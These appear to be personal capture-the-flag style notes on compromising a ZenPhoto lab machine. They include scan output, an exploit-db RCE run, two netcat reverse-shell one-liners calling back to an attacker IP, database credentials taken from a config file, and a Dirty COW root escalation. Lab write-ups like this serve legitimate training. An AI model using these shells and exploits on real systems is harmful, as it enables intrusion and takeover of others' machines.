## Initial Foothold
autorecon 

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  telnet? syn-ack ttl 61
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   syn-ack ttl 61 MySQL (unauthorized)

port
- 3306 (mysql) - Tried connecting with credentials `root:root`, `root:` and `admin:admin`
```
 mysql -u root -p -h 192.168.145.148 --skip-ssl
 mysql -u admin -p -h 192.168.160.41 --skip-ssl
```
- 80 (web) - feroxbuster
```
	http://192.168.160.41/test/robots.txt
	Disallow: /test/albums/
	Disallow: /test/cache/
	Disallow: /test/themes/
	Disallow: /test/zp-core/
	Disallow: /test/zp-data/
	Disallow: /test/page/search/
	Disallow: /test/uploaded/
```
`/test/albums/` nothing
`/test/cache/` nothing
`/test/themes/` nothing
`/test/zp-data/` nothing
`/test/page/search/` nothing
`/test/uploaded` nothin

`/test/zp-core/` - `http://192.168.160.41/test/zp-core/admin.php#` Login page here. `admin:admin` failed if not could try RFI which requires admin access.

I was trying so hard on the SQL injection in the `index.php` because its one of the exploit listed on exploitdb. In the end I gave up because I have no idea how to do that. Ended up cheating. 

Reading the source code of **\test** directory we can see **zenphoto version 1.4.1.4**
Exploitdb has an RCE for it.

```
searchsploit -m 18083
  Exploit: ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18083
     Path: /usr/share/exploitdb/exploits/php/webapps/18083.php
    Codes: OSVDB-76928, CVE-2011-4825
 Verified: True
File Type: PHP script, ASCII text
Copied to: /home/kali/offsec/zenphoto/18083.php
```

```
┌──(kali㉿kali)-[~/offsec/zenphoto]
└─$ php 18083.php 192.168.160.41 /test/
+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# ls
class.auth.php
class.file.php
class.history.php
class.image.php
class.manager.php
class.pagination.php
class.search.php
class.session.php
class.sessionaction.php
class.upload.php
config.base.php
config.php
config.tinymce.php
data.php
function.base.php
```

Throw back the shell to catch on penelope. First command did not work. Second command did.
```
zenphoto-shell# nc 192.168.45.212 80 -e /bin/sh

zenphoto-shell# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.212 80 >/tmp/f
```


## Privesc

Check suid and capabilities.

Under `/var/www/test/zp-data`, there is a config file that has mysql database.
```
/** for historical reasons these fields reference mysql even though the database **
 ** might be a different software                                                **/
$conf['mysql_user'] = 'root';           // Supply your Database user id.
$conf['mysql_pass'] = 'hola';           // Supply your Database password.
$conf['mysql_host'] = 'localhost';  // Supply the name of your Database server.
$conf['mysql_database'] = 'zenphoto';       // Supply the name of Zenphoto's database 
// If you're sharing the database with other tables, use a prefix to be safe.
$conf['mysql_prefix'] = "zp_";
```

Looked through the database but the password is encoded and we cant crack it.
```
mysql -h localhost -u root -p
Enter password: hola
```

The intended method is the use of kernel exploit. Pwnkit and Dirtyc0w both works.
```
www-data@offsecsrv:/tmp$ ./dirtyc0w32 
Please enter the new password: 
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: b77db000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@offsecsrv:/tmp$ /etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: b77db000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

www-data@offsecsrv:/tmp$ su firefart
Password: 
firefart@offsecsrv:/tmp# cd /root
```
